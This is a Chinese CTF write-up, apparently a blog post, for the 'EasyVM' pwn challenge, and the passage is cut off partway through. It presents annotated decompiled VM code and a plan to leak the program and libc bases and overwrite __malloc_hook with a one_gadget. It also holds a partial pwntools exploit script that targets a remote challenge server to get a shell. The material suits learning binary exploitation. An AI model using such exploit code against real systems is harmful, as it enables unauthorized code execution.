class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关键函数：执行指令</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> __cdecl <span class="token function">sub_A16</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  _BYTE <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST28_4</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// et1</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v4 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x71</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x41</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">++</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                                  <span class="token comment" spellcheck="true">// 比如说0x1109,当前判断0x09，执行这条指令后就是判断0x11了</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x42</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">++</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x43</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span><span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">++</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x44</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/</span><span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">++</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x80u</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      a1<span class="token punctuation">[</span><span class="token function">sub_9C3</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>a1<span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 通过调试发现当输入p8(0x80)+p8(a)时：</span>                                                <span class="token comment" spellcheck="true">// sub_9C3((int)a1,1)==a</span>      a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x77</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">++</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x53</span> <span class="token punctuation">)</span>              <span class="token comment" spellcheck="true">// 打印a1[3]地址内容</span>    <span class="token punctuation">{</span>      <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x22</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>>=</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">++</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x23</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;=</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">++</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x99u</span> <span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">// 0x99是退出循环</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x76</span> <span class="token punctuation">)</span>              <span class="token comment" spellcheck="true">// a1[6]</span>    <span class="token punctuation">{</span>      a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">// a1[3] = a1[6]地址内的内容，也就是下面malloc_hook，注意是两个*，被坑了。。。。</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x54</span> <span class="token punctuation">)</span>              <span class="token comment" spellcheck="true">// 写入内容到对应地址</span>    <span class="token punctuation">{</span>      v1 <span class="token operator">=</span> <span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">*</span>v1 <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x30</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">|</span><span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">++</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x31</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span><span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">++</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">9</span> <span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">// 发现 0x9+0x10组合是打印出gift</span>    <span class="token punctuation">{</span>      a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> some_gift_305c<span class="token punctuation">;</span>      <span class="token operator">++</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">++</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x11</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">++</span>a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> v3 <span class="token operator">^</span> v4<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> v4 <span class="token punctuation">)</span>    <span class="token function">sub_1080</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>通过逆向分析和调试发现，组合指令可以有这么些功能：1.打印process base。2.任意地址写入单个字符。3.打印任意地址内容</p><p>思路如下：<br>第一步：打印出程序基址(指令组合：0x9+0x11)<br>第二步：有了程序基址就可以打印got地址，就可以算出libc base(由于一次只能打印一个字符，所以需要4次，got表地址逐个加一即可: 0x80+输入偏移(3)+address+0x53+”\x00”）<br>第三步：向malloc_hook写入one_gadget(0x80+输入偏移(6)+我们想修改的地址所在的地址（heap中）+0x76+内容(malloc_hook)+0x54</p><p>任意地址写入单个字符的功能是： 我们可以将任意地址写入heap中，然后再向该地址写入任意数据。由于反编译指令中发现比较复杂，同时又因为所有的信息都可以获得。那么我们可以单步调试查看所有malloc地址写入的heap中的地址。所以就是<br>0x80+输入偏移(6)+我们想修改的地址所在的地址（heap1）+0x76+内容(malloc_hook)+0x54<br>0x80+输入偏移(6)+我们想修改的地址所在的地址（heap2）+0x76+内容(malloc_hook+1)+0x54<br>0x80+输入偏移(6)+我们想修改的地址所在的地址（heap3）+0x76+内容(malloc_hook+2)+0x54<br>0x80+输入偏移(6)+我们想修改的地址所在的地址（heap4）+0x76+内容(malloc_hook+3)+0x54</p><p>0x80：<br> a1[6]=想要写入地址（其中想要改的地址在这个地址）<br>0x76:<br>a1[3]=a1[6]地址的内容（malloc_hook）<br>0x54:<br>*a[3] = getchar</p><p>第四步：触发free报错，执行malloc_hook </p><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./EasyVM'</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> <span class="token number">0x3c4b20</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x3ac5c</span><span class="token punctuation">,</span><span class="token number">0x3ac5e</span><span class="token punctuation">,</span><span class="token number">0x3ac62</span><span class="token punctuation">,</span><span class="token number">0x3ac69</span><span class="token punctuation">,</span><span class="token number">0x5fbc5</span><span class="token punctuation">,</span><span class="token number">0x5fbc6</span><span class="token punctuation">]</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./EasyVM'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.36.215.224'</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.02</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># -----get process base-------</span>gift<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x11</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x99</span><span class="token punctuation">)</span><span class="token punctuation">)</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>data <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>process_base <span class="token operator">=</span> data <span class="token operator">>></span> <span class="token number">12</span>process_base <span class="token operator">=</span> process_base <span class="token operator">&lt;&lt;</span> <span class="token number">12</span>success<span class="token punctuation">(</span><span class="token string">"code base ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>process_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># -------leak libc--------------</span>payload <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>process_base<span class="token operator">+</span><span class="token number">0x2fd0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x53</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span>payload<span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>process_base<span class="token operator">+</span><span class="token number">0x2fd1</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x53</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span>payload<span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>process_base<span class="token operator">+</span><span class="token number">0x2fd2</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x53</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span>payload<span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>process_base<span class="token operator">+</span><span class="token number">0x2fd3</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x53</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span>payload<span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0x99</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> data <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc base ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># -----------get shell------------</span>target <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0xf7fb2150</span><span class="token operator">-</span><span class="token number">0xf7e00000</span><span class="token punctuation">)</span>data <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x53</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x00'</span>data <span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>target<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x53</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x00'</span>data <span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>target<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x53</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x00'</span>data <span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token 